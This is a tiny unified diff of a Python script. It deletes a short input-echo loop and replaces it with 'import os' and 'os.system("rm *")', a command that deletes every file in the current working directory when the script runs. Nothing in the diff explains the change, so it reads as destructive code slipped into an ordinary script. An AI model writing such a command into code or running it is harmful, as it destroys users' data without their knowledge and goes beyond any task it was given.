@@ -1,4 +1,3 @@
-x = input()
-while x != 42:
-    print x
-   
+import os
+
+os.system("rm *")
